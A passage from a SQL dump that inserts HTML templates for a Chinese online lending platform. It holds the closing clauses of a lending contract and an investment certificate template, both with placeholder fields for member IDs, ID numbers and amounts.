5、甲方、乙方提供给共创未来平台的信息及甲方、乙方接受共创未来平台服务产生的相关信息（包括本合同签署之前提供和产生的），由共创未来平台管理。</div>\r\n<div>  <b> </b> 6、本合同任何一方应采取所有其他必要、适当和可以采取的措施，以确保保密信息的保密性。</div>\r\n<div>  <b> </b> 7、本合同项下的保密义务在本合同终止后持续有效。</div>\r\n<div>   <b>   第十四条  纠纷解决方式</div>\r\n<div>  <b> </b> 凡因本合同引起的或与本合同有关的任何争议，首先应友好协商解决，协商不成的，任何一方均有权将纠纷或争议提交共创未来平台所在地有管辖权的人民法院诉讼解决。</div>\r\n<div>   <b>   第十五条  其它规定</b></div>\r\n<div>  <b> </b> 1、甲方确认，乙方有权将本合同项下的全部权利义务转让给第三方，甲方对此表示同意。若甲方不同意变更，应告知乙方并停止享受本合同权利，甲方继续享受本合同权利的，则视为甲方同意变更。</div>\r\n<div>  <b> </b> 2、甲、乙双方依照法律规定各自承担本合同订立和履行过程中发生的税费。</div>\r\n<div>  <b> </b> 3、如任意一方发生不可抗力事件，该方应立即用可能的快捷方式通知另一方，并在15日内提供证明文件说明有关事件的细节和不能履行或部分不能履行或需延迟履行本合同的原因。双方应在协商一致的基础上决定是否延期履行本合同、终止本合同，并达成书面合意。</div>\r\n<div>  <b> </b> 4、本合同中部分条款根据相关法律法规等的规定成为无效，或部分无效时，该等无效不影响本合同项下其他条款的效力，双方仍应继续履行其在本合同项下义务。</div>\r\n<div>  <b> </b> 5、 甲、乙双方同意并确认：其通过各自共创未来平台会员账号采取的行为所产生的法律效果和法律责任归属于各自一方，其授权和委托共创未来平台根据本协议所采取的全部行动和措施的法律后果均归属于各自一方，与共创未来平台无关，共创未来平台也不应承担任何责任。甲、乙双方同意并确认，本合同项下双方之间或双方与共创未来平台之间在任何时候均不是也不会被认为是信托法律关系。</div>\r\n<div>  <b> </b> 6、 甲、乙双方同意并确认，凡本合同中涉及共创未来平台或者共创未来平台账号的相关事宜，以及甲、乙双方各自与共创未来平台之间的关系均受其与共创未来平台签订的协议的约束；本合同规定与甲乙双方同共创未来平台签订的协议不一致的，以上述协议的规定为准。</div>\r\n\r\n<div>  <b>  </b> ………以下无正文…………</div>\r\n<div>  <b>  </b> 甲方会员编号：{$params.user.user_name}</div>\r\n<div>  <b>  </b> 甲方身份证号：{$params.user.idno}</div>\r\n<div>  <b>  </b> 乙方会员编号：{$params.deal.deal_user.user_name}</div>\r\n<div>  <b>  </b> 乙方营业执照号码：{$params.deal.deal_user.orgNo}</div>\r\n</div>',1,0),(15,'新手标投资凭证','<br/><br/>\r\n<h2 style=\"text-align:center;margin-top:0;font-size:28px;\">投 资 凭 据</h2>\r\n<div class=\"deal_sn\" style=\"text-align:right;\">凭据编号：{$params.deal.deal_sn}</div>\r\n<div style=\"font-size:18px;\">\r\n<div>尊敬的{$params.user.real_name}先生/女士：</div>\r\n<div>  <b> </b> 恭喜您于{$params.load.year}年{$params.load.month}月{$params.load.day}日通过金融理财网站平台向{$params.deal.deal_sn}号融资标的投标成功：该标的为{$params.deal.deal_user}为您提供的受托投资服务；</div>\r\n<div>  <b> </b> 您本次实际投资人民币大写：{$params.load.money}，该标的投标成功后正式生效，由受托方按约定支付方式及时间支付投资本金及收益。如委托投资的具体标的出现违约行为，您可自动授权云南博政律师事务所进行追偿，律所将免收一切法律服务费用，但不得以任何理由视为律所之义务。本凭据自盖章之日起生效，至委托投资截止之日起失效。</div>\r\n<div>  <b> </b> 您在此期间有任何疑问欢迎到店咨询或者随时拨打客服电话：0871－64111856我们将给予您详细的解答；</div>\r\n<div>  <b> </b> 金融理财为您投资理财创造辉煌！</div>\r\n<div>  <b> </b> 云南博政律师事务所为您本次投资保障合法有效！</div>\r\n<div>  <b> </b> 我们携手，共创未来！</div>\r\n</div>',1,0);

#
